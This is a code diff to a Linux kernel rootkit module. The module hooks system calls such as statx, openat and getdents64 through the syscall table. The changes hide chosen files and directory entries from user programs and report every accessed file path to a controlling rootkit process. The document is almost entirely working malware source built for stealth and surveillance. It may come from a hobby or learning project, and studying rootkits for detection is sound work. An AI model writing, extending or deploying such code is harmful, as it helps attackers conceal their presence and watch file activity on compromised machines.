@@ -9,6 +9,8 @@
 #include <linux/fs.h>
 #include <linux/fs_struct.h>
 #include <linux/sched.h>
+#include <linux/path.h>
+#include <linux/dcache.h>
 
 #include "communicate.h"
 #include "hidden_files_trie.h"
@@ -159,13 +161,15 @@ asmlinkage int new_lstat(const struct pt_regs *regs) {
 //_____________________ statx syscall
 struct hook_handle statx_hook;
 
+char statx_buff[PATH_MAX];
+
 asmlinkage int new_statx(const struct pt_regs *regs) {
     char __user
     *path = (char *) regs->si;
 
-    if (path[0] == '/') {
-        my_send_msg(rootkit_pid, path); // send data (file path)
+    my_send_msg(rootkit_pid, path); // send data (file path)
 
+    if (path[0] == '/') {
         if (contains_prefix(trie, path)) {
             printk(KERN_INFO
             "hid the path from statx: %s\n", path);
@@ -178,24 +182,32 @@ asmlinkage int new_statx(const struct pt_regs *regs) {
         switch (dirfd) {
             case AT_FDCWD: {
                 struct path pwd = current->fs->pwd;
-                path_get(&pwd);
+//                path_get(&pwd);
 
-                char *buf = (char *) kmalloc(GFP_KERNEL, PATH_MAX);
-                char *cwd = d_path(&pwd, buf, 100 * sizeof(char));
+                memset(statx_buff, '\x00', PATH_MAX);
+                char *cwd = d_path(&pwd, statx_buff, PATH_MAX);
                 printk(KERN_INFO
                 "cwd: %s", cwd);
 
-                struct node* s = search(get_root(trie), cwd);
-                kfree(buf);
+//                path_put(&pwd);
+
+                struct node *s = get_root(trie);
+
+                if (node_contains_prefix(s, cwd)) goto hide; // found
+                s = search(s, cwd);
                 if (s == NULL) break; // not found
 
+                if (node_contains_prefix(s, "/")) goto hide; // found
                 s = search(s, "/");
                 if (s == NULL) break; // not found
 
-                s = search(s, path);
-                if (s == NULL) break; // not found
+                if (node_contains_prefix(s, path)) goto hide; // found
+                else break;
 
                 // found
+                hide:
+                printk(KERN_INFO
+                "hiding in statx: %s", path);
                 return -1;
             }
         }
@@ -230,45 +242,56 @@ asmlinkage int new_getdents64(const struct pt_regs *regs) {
     if (ret <= 0)
         return ret;
 
-//    int fd = regs->di;
-//
-//    spin_lock(&current->files->file_lock);
-//    struct file *file = fcheck_files(current->files, fd);
-//    if (!file) {
-//        spin_unlock(&current->files->file_lock);
-//        return ret;
-//    }
-//
-//    struct path *path = &file->f_path;
-//    path_get(path);
-//    spin_unlock(&current->files->file_lock);
-//
-//    char *tmp = (char *)__get_free_page(GFP_KERNEL);
-//    if (!tmp) {
-//        path_put(path);
-//        return ret;
-//    }
-//
-//    char *pathname = d_path(path, tmp, PAGE_SIZE);
-//    path_put(path);
-//
-//    if (IS_ERR(pathname)) {
-//        free_page((unsigned long)tmp);
-//        return ret;
-//    }
-//
-//    printk(KERN_INFO "directory of getdents: %s", pathname);
-//
-//    free_page((unsigned long)tmp);
+    int fd = regs->di;
 
+    struct file *file = fget(fd); // get the struct file associated with the file descriptor
+    if (file == NULL) {
+        printk(KERN_ALERT
+        "Failed to get file structure for fd: %u\n", fd);
+        return ret;
+    }
+
+    struct path path = file->f_path; // get the path associated with the struct file
+    // Now 'path' contains the path information, you can use path_get to increment the reference count
+//    path_get(&path);
+
+    fput(file); // release the reference to the struct file
+
+    char buff[PATH_MAX];
+    memset(buff, '\x00', PATH_MAX);
+    char *dir_path = d_path(&path, buff, PATH_MAX);
+    printk(KERN_INFO
+    "Directory Path: %s\n", dir_path);
+
+    struct node *s = search(get_root(trie), dir_path);
+    if (s == 0) {
+        // directory is okay anyway, can return now
+//        path_put(&path); // Release the reference to the path
+        return ret;
+    } else {
+        s = search(s, "/");
+        if (s == 0) {
+            // directory is okay anyway, can return now
+//            path_put(&path); // Release the reference to the path
+            return ret;
+        }
+    }
+
+
+    printk(KERN_INFO
+    "checking directory");
     struct linux_dirent64 __user
     *dirent = (struct linux_dirent64 *) regs->si;
 
     // copying the whole buffer from userspace
-    struct linux_dirent64 *buffer = kzalloc(ret, GFP_KERNEL);
+    struct linux_dirent64 *buffer = (struct linux_dirent64 *) kmalloc(regs->dx,
+                                                                      GFP_KERNEL); // todo problem probably because of too many allocations and deallocations?
+    if (buffer == NULL) {
+        return ret;
+    }
     if (copy_from_user(buffer, dirent, ret)) {
-        printk(KERN_INFO
-        "can't copy buffer from user");
+        kfree(buffer);
+        return ret;
     }
 
     unsigned long offset = 0;
@@ -278,57 +301,40 @@ asmlinkage int new_getdents64(const struct pt_regs *regs) {
         struct linux_dirent64 *current_dir = (struct linux_dirent64 *) ((void *) buffer + offset);
         int curr_dir_sz = current_dir->d_reclen; // curr dir size
 
-        if (memcmp("Desktop", current_dir->d_name, strlen("Desktop")) == 0) { // hide this entry
-            printk(KERN_INFO
-            "removing some entry");
+        struct node *e_s = search(s, current_dir->d_name);
+        if (e_s == 0) goto proceed;
+
+        if (isMarked(e_s)) { // hide this entry
             curr_ret -= curr_dir_sz; // decremnting this dir's size from final size
             sz_left -= curr_dir_sz;
             if (sz_left > 0)
                 memmove(current_dir, (void *) current_dir + curr_dir_sz,
                         sz_left); // shifting down the rest of the directories, effectively "destroying" the current directory
-        } else {
+
+            continue;
+        }
+
+        proceed:
+        {
             offset += curr_dir_sz;
             sz_left -= curr_dir_sz;
         }
     }
 
+//    path_put(&path); // Release the reference to the path
+
     // resetting the rest of the buffer
     memset((void *) buffer + curr_ret, '\x00', ret - curr_ret);
 
     // copying our local buffer that may have been edited back to userspace
-    if (copy_to_user(dirent, buffer, ret)) {
-        printk(KERN_INFO
-        "can't copy buffer back to user");
+    if (copy_to_user(dirent, buffer, curr_ret)) {
+        kfree(buffer);
+        return ret;
     }
 
-    kfree(buffer);
+    kfree((void *) buffer);
 
-    return curr_ret - 1;
-
-
-
-//    // going to skip entries, looking for our pid
-//    struct linux_dirent *curr = (struct linux_dirent *) regs->si;
-//    int i = 0;
-//    while (i < ret) {
-//
-//        // checking if it is our process_access
-//        if (!strcmp(curr->d_name, pid)) {
-//
-//            // length of this linux_dirent
-//            int reclen = curr->d_reclen;
-//            char *next = (char *) curr + reclen;
-//            int len = (int) regs->si + ret - (uintptr_t) next;
-//            memmove(curr, next, len);
-//            ret -= reclen;
-//            continue;
-//        }
-//
-//        i += curr->d_reclen;
-//        curr = (struct linux_dirent *) ((char *) regs->si + i);
-//    }
-//
-//    return ret;
+    return curr_ret;
 }
 
 //_____________________ openat syscall
@@ -339,6 +345,50 @@ asmlinkage int new_openat(const struct pt_regs *regs) {
     *path = (char *) regs->si;
 
     my_send_msg(rootkit_pid, path); // send data (file path)
+
+    if (path[0] == '/') {
+        if (contains_prefix(trie, path)) {
+            printk(KERN_INFO
+            "hid the path from openat: %s\n", path);
+            return -1;
+        }
+
+    } else {
+        int dirfd = regs->di;
+
+        switch (dirfd) {
+            case AT_FDCWD: {
+                struct path pwd = current->fs->pwd;
+//                path_get(&pwd);
+
+                memset(statx_buff, '\x00', PATH_MAX);
+                char *cwd = d_path(&pwd, statx_buff, PATH_MAX);
+                printk(KERN_INFO
+                "cwd: %s", cwd);
+
+//                path_put(&pwd);
+
+                struct node *s = get_root(trie);
+
+                if (node_contains_prefix(s, cwd)) goto hide; // found
+                s = search(s, cwd);
+                if (s == NULL) break; // not found
+
+                if (node_contains_prefix(s, "/")) goto hide; // found
+                s = search(s, "/");
+                if (s == NULL) break; // not found
+
+                if (node_contains_prefix(s, path)) goto hide; // found
+                else break;
+
+                // found
+                hide:
+                printk(KERN_INFO
+                "hiding in openat: %s", path);
+                return -1;
+            }
+        }
+    }
 
     return (*((int (*)(const struct pt_regs *)) openat_hook.orig_syscall_addr))(regs);
 }
@@ -355,21 +405,26 @@ asmlinkage int new_reboot(const struct pt_regs *regs) {
 
 
 unsigned long *sys_call_table_addr;
+
 struct {
-    struct hook_handle* handle;
+    struct hook_handle *handle;
+
     int (*hook_func)(const struct pt_regs *);
+
     int syscall_index;
 } hooks_arr[] = {
-        {&open_hook, new_open, __NR_open},
-        {&stat_hook, new_stat, __NR_stat},
-        {&lstat_hook, new_lstat, __NR_lstat},
-        {&statx_hook, new_statx, __NR_statx},
-        {&access_hook, new_access, __NR_access},
+        {&open_hook,       new_open,       __NR_open},
+        {&stat_hook,       new_stat,       __NR_stat},
+        {&lstat_hook,      new_lstat,      __NR_lstat},
+        {&statx_hook,      new_statx,      __NR_statx},
+        {&access_hook,     new_access,     __NR_access},
         {&getdents64_hook, new_getdents64, __NR_getdents64},
-        {&openat_hook, new_openat, __NR_openat}
+        {&openat_hook,     new_openat,     __NR_openat}
 };
 
-static int __init rootkit_init(void) {
+static int __init
+
+rootkit_init(void) {
     setup_my_channel();
 
     // getting syscall table address from kallsyms_lookup_name function
@@ -380,32 +435,6 @@ static int __init rootkit_init(void) {
     }
 
     trie = create_trie();
-
-    /*
-    // hook open
-//    open_hook = hook_syscall(new_open, __NR_open, sys_call_table_addr);
-
-    // hook stat
-//    stat_hook = hook_syscall(new_stat, __NR_stat, sys_call_table_addr);
-
-    // hook lstat
-//    lstat_hook = hook_syscall(new_lstat, __NR_lstat, sys_call_table_addr);
-
-    // hook statx
-//    statx_hook = hook_syscall(new_statx, __NR_statx, sys_call_table_addr);
-
-    // hook access
-//    access_hook = hook_syscall(new_access, __NR_access, sys_call_table_addr);
-
-    // hook getdents64
-//    getdents64_hook = hook_syscall(new_getdents64, __NR_getdents64, sys_call_table_addr);
-
-    // hook openat
-//    openat_hook = hook_syscall(new_openat, __NR_openat, sys_call_table_addr);
-
-    // hook reboot
-//    reboot_hook = hook_syscall(new_reboot, __NR_reboot, sys_call_table_addr);
-*/
 
     return 0;
 }
@@ -425,36 +454,13 @@ void exit_my_module(void) {
     if (trie != 0)
         free_trie(trie);
 
-    /*
-    // unhook open
-//    unhook_syscall(open_hook, sys_call_table_addr);
-
-    // unhook stat
-//    unhook_syscall(stat_hook, sys_call_table_addr);
-
-    // unhook lstat
-//    unhook_syscall(lstat_hook, sys_call_table_addr);
-
-    // unhook statx
-//    unhook_syscall(statx_hook, sys_call_table_addr);
-
-    // unhook access
-//    unhook_syscall(access_hook, sys_call_table_addr);
-
-    // unhook getdents
-//    unhook_syscall(getdents64_hook, sys_call_table_addr);
-
-    // unhook openat
-//    unhook_syscall(openat_hook, sys_call_table_addr);
-
-    // unhook reboot
-//    unhook_syscall(reboot_hook, sys_call_table_addr);
-*/
 
     close_my_channel();
 }
 
-static void __exit rootkit_exit(void) {
+static void __exit
+
+rootkit_exit(void) {
     exit_my_module();
 }
 
